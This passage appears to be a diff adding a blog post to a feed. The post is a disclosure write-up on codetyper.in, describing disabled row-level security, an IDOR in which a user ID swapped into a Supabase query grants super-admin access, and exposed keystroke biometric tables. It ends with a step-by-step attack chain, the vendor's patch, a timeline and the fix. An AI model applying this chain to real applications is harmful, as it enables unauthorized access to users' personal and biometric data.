+&lt;li&gt;Log in as a normal user (attacker_test) and obtain a valid session.&lt;/li&gt;
+&lt;li&gt;Intercept the authenticated request to &lt;code&gt;/admin&lt;/code&gt; using Burp Suite Community Edition.&lt;/li&gt;
+&lt;li&gt;In the request context, the app builds the query using &lt;code&gt;r.user.id&lt;/code&gt;. By substituting my user ID (&lt;code&gt;ed1a1746-...&lt;/code&gt;) with the admin&#x27;s user ID (&lt;code&gt;f1f55801-...&lt;/code&gt;), the query becomes:
+&lt;pre&gt;&lt;code&gt;U.from(&quot;admins&quot;).select(&quot;*&quot;).eq(&quot;user_id&quot;, &quot;f1f55801-...&quot;).maybeSingle()&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;The DB returns the admin&#x27;s role record (&lt;code&gt;super&lt;/code&gt;).&lt;/li&gt;
+&lt;li&gt;The app sets &lt;code&gt;isSuper = true&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Full admin panel access granted.&lt;/strong&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;&lt;strong&gt;Impact:&lt;/strong&gt; Read/write access to all user data, blog posts, changelogs, roadmap items, sessions, and admin user management.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; Critical (CVSS 9.7)&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;step5&quot;&gt;&lt;a href=&quot;#step5&quot;&gt;#&lt;/a&gt; Step 5: Biometric Data Exposure&lt;/h2&gt;
+&lt;p&gt;The bundle referenced two sensitive tables:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;// keystroke_events
+.select(&quot;expected_key, key, is_error, time_since_last_ms, session_id&quot;)
+.insert(m.slice(w, w+500))  // batches of 500
+
+// ghost_recordings
+.insert({
+  session_id: u.id,
+  snippet_id: a.id,
+  user_id: s.user.id,
+  recording_json: { keystrokes: d },
+  deft_score: r.deftScore,
+  gross_wpm: r.grossWpm,
+  accuracy: r.grossAccuracy
+})&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;keystroke_events&lt;/code&gt; stores every key press and millisecond timing between them.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;ghost_recordings&lt;/code&gt; stores full replay data including the actual code snippet content.&lt;/p&gt;
+
+&lt;p&gt;With the RLS bypass confirmed, these were accessible without authentication.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Severity:&lt;/strong&gt; Critical. Biometric data exposure.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;chain&quot;&gt;&lt;a href=&quot;#chain&quot;&gt;#&lt;/a&gt; The Full Chain&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;1. curl the JS bundle          → URL, key, table names
+2. curl profiles table         → 53 user records + 1 admin ID
+3. Register account            → valid JWT session
+4. Intercept /admin request    → swap user_id for admin_id
+5. Query admins table          → returns &quot;super&quot; role
+6. Access /admin/*             → full dashboard control
+7. Query keystroke_events      → download typing biometrics&lt;/code&gt;&lt;/pre&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;vendor&quot;&gt;&lt;a href=&quot;#vendor&quot;&gt;#&lt;/a&gt; Vendor Response&lt;/h2&gt;
+&lt;p&gt;The team responded promptly and professionally. Here&#x27;s a brief snippet of their response:&lt;/p&gt;
+
+&lt;blockquote&gt;&quot;Thank you again for taking the time to conduct this assessment and practice responsible disclosure. I&#x27;m writing to let you know that we have deployed a comprehensive security patch, and the critical vulnerabilities you outlined have been remediated.&quot;&lt;/blockquote&gt;
+
+&lt;p&gt;If you&#x27;re reading this, all vulnerabilities described here have been remediated.&lt;/p&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;&lt;a href=&quot;#timeline&quot;&gt;#&lt;/a&gt; Disclosure Timeline&lt;/h2&gt;
+&lt;table&gt;
+&lt;tr&gt;&lt;th&gt;Date&lt;/th&gt;&lt;th&gt;Milestone&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-17&quot;&gt;April 17, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Initial passive reconnaissance&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-18&quot;&gt;April 18, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Active testing; RLS bypass and IDOR confirmed&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-19&quot;&gt;April 19, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Deep bundle analysis; findings reported to vendor&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-20&quot;&gt;April 20, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Vendor confirms patches deployed&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td&gt;&lt;time datetime=&quot;2026-04-21&quot;&gt;April 21, 2026&lt;/time&gt;&lt;/td&gt;&lt;td&gt;Write-up published&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;
+
+&lt;hr&gt;
+
+&lt;h2 id=&quot;tldr&quot;&gt;&lt;a href=&quot;#tldr&quot;&gt;#&lt;/a&gt; TL;DR&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;RLS was off.&lt;/strong&gt; 53 user profiles and sessions were readable by anyone with the anon key. (Leaderboards are public by design, so that is not an issue.)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;IDOR in the admin check.&lt;/strong&gt; Swapping my user ID for an admin&#x27;s ID in the Supabase query granted super-admin access.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Biometric data leaked.&lt;/strong&gt; Keystroke timing and ghost recordings were accessible without authentication.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Fix:&lt;/strong&gt; Proper RLS + server-side authorization checks.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;hr&gt;
+
+&lt;p&gt;&lt;em&gt;All sensitive information was redacted. Testing performed with explicit authorization. No data was modified or destroyed. In the event that I missed something, please contact me by one of the methods on the main page of my site.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p class=&quot;related&quot;&gt;Related: &lt;a href=&quot;https://btea.dev/blog/codetyper-still-broken.html&quot;&gt;Still Broken: Re-assessing codetyper.in After Patches&lt;/a&gt; — the round 2/3 follow-up after the vendor claimed patches.&lt;/p&gt;</content>
+	</entry>
+</feed>
